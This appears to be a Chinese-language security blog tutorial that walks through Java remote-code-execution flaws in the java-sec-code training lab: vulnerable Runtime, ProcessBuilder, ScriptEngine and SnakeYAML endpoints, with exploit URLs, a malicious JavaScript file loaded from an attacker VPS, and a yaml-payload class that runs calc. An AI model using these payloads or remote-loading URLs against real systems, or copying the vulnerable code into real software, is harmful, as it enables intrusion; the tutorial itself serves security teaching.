        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="RCE-简述"><a href="#RCE-简述" class="headerlink" title="RCE 简述"></a>RCE 简述</h2><p>RCE (Remote Code Execution), 远程代码执行漏洞，这里包含两种类型漏洞:<code>命令注入（Command Injection）</code>，在某种开发需求中，需要引入对系统本地命令的支持来完成特定功能，当未对输入做过滤时，则会产生命令注入。<code>代码注入（Code Injection）</code>，在正常的java程序中注入一段java代码并执行，即用户输入的数据当作java代码进行执行。</p><h2 id="Java-命令执行函数"><a href="#Java-命令执行函数" class="headerlink" title="Java 命令执行函数"></a>Java 命令执行函数</h2><p>Java 命令执行函数相对 PHP 来说，能够进行命令执行的函数并不多，只有两个 <code>Runtime</code> ,<code>ProcessBuilder</code>，其他方法也能进行命令执行，本文主要介绍如下：</p><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span><table><tbody><tr><td class="code"><pre>| 函数/其他              | 作用                                             || --------------------- | --------------------------------------------     || Runtime               | 命令执行                                          || ProcessBuilder        | 命令执行                                          || ScriptEbgine（JScmd） | 加载远程 js 文件来执行命令                          || yml                   | 利用 SnakeYAML 将 yaml 文件解析 yml，进行命令执行   || groovy                | 不安全使用 groovy 导致命令执行                     |</pre></td></tr></tbody></table></figure><br/><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><h3 id="一、项目地址"><a href="#一、项目地址" class="headerlink" title="一、项目地址"></a>一、项目地址</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/JoyChou93/java-sec-code</span><br></pre></td></tr></table></figure></div><br/><h3 id="二、环境配置"><a href="#二、环境配置" class="headerlink" title="二、环境配置"></a>二、环境配置</h3><p>1、导入源码中的 sql 文件至 Mysql 数据库。</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924211209757.png" data-caption="image-20220924211209757"><img src="/../images/Java/rce/image-20220924211209757.png" alt="image-20220924211209757"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924211301830.png" data-caption="image-20220924211301830"><img src="/../images/Java/rce/image-20220924211301830.png" alt="image-20220924211301830"></a></p><p>2、修改源码数据库 root 密码</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924210314888.png" data-caption="image-20220924210314888"><img src="/../images/Java/rce/image-20220924210314888.png" alt="image-20220924210314888"></a></p><p>3、编译项目</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164044238-16640246936051.png" data-caption="image-20220915164044238"><img src="/../images/Java/rce/image-20220915164044238-16640246936051.png" alt="image-20220915164044238"></a></p><p>右键run，成功启动项目</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164142524.png" data-caption="image-20220915164142524"><img src="/../images/Java/rce/image-20220915164142524.png" alt="image-20220915164142524"></a></p><p>成功搭建，账号密码：admin&#x2F;admin123、joychou&#x2F;joychou123</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164229589.png" data-caption="image-20220915164229589"><img src="/../images/Java/rce/image-20220915164229589.png" alt="image-20220915164229589"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220915164400359.png" data-caption="image-20220915164400359"><img src="/../images/Java/rce/image-20220915164400359.png" alt="image-20220915164400359"></a></p><p>若前期环境没有搭建，请参考上一篇文章。</p><h2 id="漏洞学习"><a href="#漏洞学习" class="headerlink" title="漏洞学习"></a>漏洞学习</h2><h3 id="一、Runtime-命令执行"><a href="#一、Runtime-命令执行" class="headerlink" title="一、Runtime 命令执行"></a>一、Runtime 命令执行</h3><p>Runtime 类封装了运行时的环境，每个 Java 应用程序都有一个 Runtime 类实例，使应用程序能够与其运行的环境相连接。一般不能实例化一个 Runtime 对象，应用程序也不能创建自己的 Runtime 类实例，但可以通过 getRuntime 方法获取当前 Runtime 运行时对象的引用。当 Runtime 的对象被引用，就可以调用 Runtime 对象的方法去控制 Java 虚拟机的状态和行为。 </p><p>漏洞分析，具体漏洞代码如下:</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/rce&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rce</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/runtime/exec&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">CommandExec</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">run</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> run.exec(cmd);</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (p.waitFor() != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p.exitValue() == <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Command exec failed!!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>IDEA调试分析，定位漏洞代码，利用IDEA全局搜索，定位危险函数 <code>右键目录 -》 Find in files</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918141941315.png" data-caption="image-20220918141941315"><img src="/../images/Java/rce/image-20220918141941315.png" alt="image-20220918141941315"></a></p><p>搜索 <code>runtime</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142058897.png" data-caption="image-20220918142058897"><img src="/../images/Java/rce/image-20220918142058897.png" alt="image-20220918142058897"></a></p><p>当多处存在则需要进一步分析,定位到 <code>runtime</code> 危险函数文件为 <code>Rce.java</code> , 初步分析其代码，没有发现进行过滤处理</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142354828.png" data-caption="image-20220918142354828"><img src="/../images/Java/rce/image-20220918142354828.png" alt="image-20220918142354828"></a></p><p>跟进 <code>getRuntime()</code> 方法，<code>Ctrl + 鼠标左键</code> 点击 <code>getRuntime</code>， 代码没有进行任何过滤，直接返回 <code>currentRuntime</code> 对象， 由下图可知，<code>currentRuntime</code> 为类 <code>Runtime</code> 的实例对象。也就是说，每次调用 <code>getRuntime()</code> 方法都会由类 <code>Runtime</code> 产生一个新的实例对象 <code>new Runtime()</code>。</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918142639287.png" data-caption="image-20220918142639287"><img src="/../images/Java/rce/image-20220918142639287.png" alt="image-20220918142639287"></a></p><p>代码即可分析为,当调用了 <code>getRuntime()</code> 产生了一个新的 <code>Runtime</code> 对象后，再进行下一步执行 <code>run.exec()</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918143346281.png" data-caption="image-20220918143346281"><img src="/../images/Java/rce/image-20220918143346281.png" alt="image-20220918143346281"></a></p><p>跟进 <code>exec</code> 方法， <code>Ctrl + 鼠标左键</code>点击 <code>exec</code> ,通过实例化了 <code>Runtime.getRuntime()</code> ,利用 <code>exec</code> 去执行传入的参数。</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144021479.png" data-caption="image-20220918144021479"><img src="/../images/Java/rce/image-20220918144021479.png" alt="image-20220918144021479"></a></p><p>漏洞复现，定位漏洞路径，按自上到下的方法初步定位路径 <code>/rce/runtime/exec?cmd</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144306263.png" data-caption="image-20220918144306263"><img src="/../images/Java/rce/image-20220918144306263.png" alt="image-20220918144306263"></a></p><p>成功复现</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144431283.png" data-caption="image-20220918144431283"><img src="/../images/Java/rce/image-20220918144431283.png" alt="image-20220918144431283"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220918144521945.png" data-caption="image-20220918144521945"><img src="/../images/Java/rce/image-20220918144521945.png" alt="image-20220918144521945"></a></p><p>小结：通过全局搜索 Runtime ,定位是否存在危险函数，然后查看其代码是否采取了过滤机制，再跟进代码分析其执行方法，最后定位漏洞路径进行漏洞复现。</p><br/><h3 id="二、ProcessBuilder-命令执行"><a href="#二、ProcessBuilder-命令执行" class="headerlink" title="二、ProcessBuilder 命令执行"></a>二、ProcessBuilder 命令执行</h3><p><code>ProcessBuilder</code> 类通过创建系统进程执行命令,每个 <code>ProcessBuilder</code> 实例管理一个进程的属性，<code>start()</code> 方法使用这些属性创建一个新的 <code>Process</code> 实例。可以从同一实例重复调用<code>start()</code> 方法以创建具有相同或相关属性的新子进程。</p><p>漏洞分析，具体漏洞代码如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/ProcessBuilder&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">processBuilder</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// String[] arrCmd = &#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;; //Linux</span></span><br><span class="line">        String[] arrCmd = &#123;cmd&#125;;  <span class="comment">//Windows</span></span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>核心代码, 创建 <code>ProcessBuilder</code> 实例化对象，调用 <code>start</code> 方法执行 <code>arrCmd</code> </p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(arrCmd);</span><br><span class="line"><span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> processBuilder.start();</span><br></pre></td></tr></table></figure></div><p>返回 <code>Process</code> 对象 <code>p </code> 调用 <code>getInputStream</code> 获取输入流，读取输入流写入输入流。</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(p.getInputStream());</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">inBr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br></pre></td></tr></table></figure></div><p>漏洞路径找寻，依旧按照从上而下的方法找寻路径</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923103044841.png" data-caption="image-20220923103044841"><img src="/../images/Java/rce/image-20220923103044841.png" alt="image-20220923103044841"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923103020225.png" data-caption="image-20220923103020225"><img src="/../images/Java/rce/image-20220923103020225.png" alt="image-20220923103020225"></a></p><p>拼接路径，漏洞复现 <code>http://192.168.114.131:8080/rce/ProcessBuilder?cmd=calc.exe</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220923101155900.png" data-caption="image-20220923101155900"><img src="/../images/Java/rce/image-20220923101155900.png" alt="image-20220923101155900"></a></p><p>小结：参考第一部分方法，通过全局搜索 <code>ProcessBuilder</code> 定位是否存在危险函数，然后查看其代码是否采取了过滤机制，再跟进代码分析其执行方法，最后定位漏洞路径进行漏洞复现。</p><br/><h3 id="三、ScriptEngine-命令执行-jscmd"><a href="#三、ScriptEngine-命令执行-jscmd" class="headerlink" title="三、ScriptEngine 命令执行(jscmd)"></a>三、ScriptEngine 命令执行(jscmd)</h3><p><code>ScriptEngine</code> 是一个脚本引擎，包含一些操作方法，<code>eval</code> ,<code>createBindings</code>, <code>setBindings</code>。通过 <code>ScriptEngine</code> 获取 <code>jsurl</code> 传入的 <code>js</code> 脚本文件，然后再通过 <code>engine.getBindings</code> 获取 <code>js</code> 脚本文件中的方法和属性，加载 <code>js</code> 之后将其赋值给 <code>cmd</code>，然后再通过 <code>engine.eval</code> 执行，⚠️ 在 <code>Java 8</code>之后移除了 <code>ScriptEngineManager</code> 的 <code>eval</code>。</p><p>具体漏洞源码如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/jscmd&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">jsEngine</span><span class="params">(String jsurl)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// js nashorn javascript ecmascript</span></span><br><span class="line">    <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;js&quot;</span>);</span><br><span class="line">    <span class="type">Bindings</span> <span class="variable">bindings</span> <span class="operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> String.format(<span class="string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);</span><br><span class="line">    engine.eval(cmd, bindings);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>恶意js代码，放置于VPS中，待远程调用</p><div class="highlight-wrap" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="title function_">mainOutput</span>(); </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mainOutput</span>(<span class="params"></span>) &#123; </span><br><span class="line">    <span class="keyword">var</span> x=java.<span class="property">lang</span>.<span class="property">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>漏洞复现，vps上放置恶意代码</p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924200159394.png" data-caption="image-20220924200159394"><img src="/../images/Java/rce/image-20220924200159394.png" alt="image-20220924200159394"></a></p><p>远程访问加载恶意 js 实现攻击,构造链接为：<code>http://127.0.0.1:8080/jscmd?jsurl=http://x.x.x.x:8000/test.js</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/rce/image-20220924200052768.png" data-caption="image-20220924200052768"><img src="/../images/Java/rce/image-20220924200052768.png" alt="image-20220924200052768"></a></p><p>小结：通过全局搜索 <code>ScriptEngine</code> 定位是否存在危险函数，然后查看其代码是否采取了过滤机制，再跟进代码分析其执行方法，最后定位漏洞路径进行漏洞复现。</p><br/><h3 id="四、yml命令执行"><a href="#四、yml命令执行" class="headerlink" title="四、yml命令执行"></a>四、yml命令执行</h3><p>YAML(YAML Ain’t Markup Language)，也可以叫做YML，是一种人性化的数据序列化的语言，类似于XML，JSON。SpringBoot的配置文件就支持yaml文件。原理利用 <code>SnakeYAML</code> 存在的反序列化漏洞进行 <code>RCE</code>，系统在解析恶意 <code>yml</code> 内容时会完成指定的动作。触发 <code>java.net.URL</code> 去拉取远程 <code>HTTP</code> 服务器上的恶意 <code>jar</code> 文件,然后是寻找 <code>jar</code> 文件中实现 <code>javax.script.ScriptEngineFactory</code> 接口的类并实例化，实例化类时执行恶意代码，造成 RCE 漏洞。</p><p>yaml有三种数据结构，结构如下：</p><p>● 对象</p><div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写在一行</span></span><br><span class="line"><span class="attr">address:</span> &#123;<span class="attr">province:</span> <span class="string">山东</span>, <span class="attr">city:</span> <span class="string">济南</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写在多行</span></span><br><span class="line"><span class="attr">address:</span></span><br><span class="line"><span class="attr">province:</span> <span class="string">山东</span></span><br><span class="line"><span class="attr">city:</span> <span class="string">济南</span></span><br></pre></td></tr></table></figure></div><p>● 数组</p><div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写在一行</span></span><br><span class="line"><span class="attr">hobbyList:</span> [<span class="string">游泳</span>, <span class="string">跑步</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写在多行</span></span><br><span class="line"><span class="attr">hobbyList:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">游泳</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">跑步</span></span><br></pre></td></tr></table></figure></div><p>● 纯量</p><div class="highlight-wrap" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符串 默认不用加引号，包含空格或特殊字符必须加引号，单引号或双引号都可以</span></span><br><span class="line"><span class="attr">userId:</span> <span class="string">S123</span></span><br><span class="line"><span class="attr">username:</span> <span class="string">&quot;lisi&quot;</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">&#x27;123456&#x27;</span></span><br><span class="line"><span class="attr">province:</span> <span class="string">山东</span></span><br><span class="line"><span class="attr">city:</span> <span class="string">&quot;济南 : ss&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 布尔值</span></span><br><span class="line"><span class="attr">success:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 整数</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">13</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 浮点数</span></span><br><span class="line"><span class="attr">weight:</span> <span class="number">75.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Null</span></span><br><span class="line"><span class="attr">gender:</span> <span class="string">~</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间</span></span><br><span class="line"><span class="attr">createDate:</span> <span class="number">2001-12-14T21:59:43.10+05</span></span><br></pre></td></tr></table></figure></div><p>漏洞分析，具体漏洞代码如下：</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/vuln/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">yarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/sec/yarm&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">secYarm</span><span class="params">(String content)</span> &#123;</span><br><span class="line">    <span class="type">Yaml</span> <span class="variable">y</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>(<span class="keyword">new</span> <span class="title class_">SafeConstructor</span>());</span><br><span class="line">    y.load(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Payload 项目地址：<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a> ,恶意代码如下</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> artsploit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AwesomeScriptEngineFactory</span> <span class="keyword">implements</span> <span class="title class_">ScriptEngineFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AwesomeScriptEngineFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">            <span class="comment">//Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEngineVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getExtensions</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getMimeTypes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getNames</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLanguageVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    